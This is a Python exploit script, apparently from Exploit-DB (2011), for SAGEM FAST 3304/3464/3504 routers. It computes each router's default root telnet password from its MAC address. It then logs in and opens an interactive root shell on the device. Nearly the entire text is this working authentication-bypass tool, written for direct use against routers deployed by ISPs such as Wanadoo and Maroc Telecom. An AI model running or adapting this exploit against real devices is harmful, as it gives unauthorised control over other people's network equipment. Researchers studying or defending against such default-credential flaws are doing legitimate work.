#!/home/bin/python

# Remote Exploit: SAGEM ROUTER FAST 3304/3464/3504 - Telnet Authentication bypass
# Date: 15-August-2011
# Author: Elouafiq Ali
# Version: 3304-V1 / 3304-V2 / 3464 / 3504
# Tested on: Linux Ubuntu 11.04, Linux Backtrack 5
# Tested Router: SAGEM FAST 3304-V2
# Tested on Resellers/ISPs: Wanadoo (France), Maroc Telecom (Morocco)
# Products affected: Sagem Fast 3304-V1 / 3304-V2 / 3464 / 3504
# Blog: http://keelhaule.tumblr.com

"""
	Sagem Fast Routers (3304-V1 / 3304-V2 / 3464 / 3504) Come with a default Preconfigured Root Password
	That the ISPs don't change it, but instead they create another admin account above it,
	the root password differs from a router to another, since it is computed from its MAC address.
	Thus, each unique router has its own password what makes bruteforce or dictionary attacks inefficient or impossible
	After reverse engineering the Algorithm that computes the default password based on the MAC address
	This exploit opens a remote shell in the remote host.
	(Generally its an Almquist Shell 'ash', which commands are compatible to the Bourne Shell 'bsh')

	Usage: ./{file_name} ip_adress mac_address
"""


from telnetlib import Telnet
import time, sys, tty, termios
from threading import *

host = ''
port = 23
user = "root" 
password=""
class ReaderThread(Thread):
        def __init__(self, telnet):
                self.telnet = telnet
                Thread.__init__(self)
        
        def run(self):
                while 1:
                        str = self.telnet.read_some()
                        if str == '': break
                        sys.stdout.write(str)
                        sys.stdout.flush()
def mash(a,b):
  first=min(a,b)
  second=max(a,b)
  if( int(second ,16 ) < 10) :
    if(int(first,16)+int(second,16)<=9):
      return chr(ord(first)+int(second,16))
    else:
      return hex(ord(first)+int(second,16))
  else: 
      return chr(ord(second)+int(first,16))

def main(host, port):
        telnet = Telnet()
        telnet.open(host, port)
	#Usually Telnet prompt starts with this, if the telnet service provide another
	#prompt, change it to that prompt
	telnet.read_until("login: ") 
	telnet.write(user + "\n")
	#the note above also applies for this
	telnet.read_until("Password: ")
	telnet.write(password + "\n")
	#just omit this line if you want to just have the telnet command prompt,
	#or change it to what feel confortable with
	telnet.write("shell\n")
        reader = ReaderThread(telnet)
        reader.start()

	fd = sys.stdin.fileno()
	old_settings = termios.tcgetattr(fd)
	tty.setraw(fd)
        while 1:
                if not reader.isAlive(): break
		ch = sys.stdin.read(1)
                telnet.write(ch)
        telnet.close()
	termios.tcsetattr(fd, 1, old_settings)

if __name__ == '__main__':
        try:
                host = sys.argv[1]
        except: pass
	mac_address=sys.argv[2]
	lenght=len(mac_address)
	#some arbitrary value
	password=[ c for c in "00000000" ] 
	if lenght!=12 :
		# Input Sanitization and Normalization
		if lenght==17:
			if mac_address[2]==':' :
				mac_address = "".join([i.zfill(2) for i in mac_address.split(":")]).lower()
			elif mac_address[2]=='-' :
				mac_address = "".join([i.zfill(2) for i in mac_address.split(":")]).lower()
			else:	
				print  '[!] Please enter a valid MAC address!'	
				exit()
		else:
			print  "[!] Please enter a valid MAC address!"
			exit()
	
	mac=[ c.lower() for c in mac_address]

	password[0]= mash(mac[5],mac[11])
	password[1]= mash(mac[0],mac[2])
	password[2]= mash(mac[10],mac[11])
	password[3]= mash(mac[0],mac[9])
	password[4]= mash(mac[10],mac[6])
	password[5]= mash(mac[3],mac[9])
	password[6]= mash(mac[1],mac[6])
	password[7]= mash(mac[3],mac[4])
	password="".join(p for p in password)
	print "[+] W00t The Passwd is ", password
        main(host, port)

# Exploit written by Ali Elouafiq , Exploit-DB , 2011
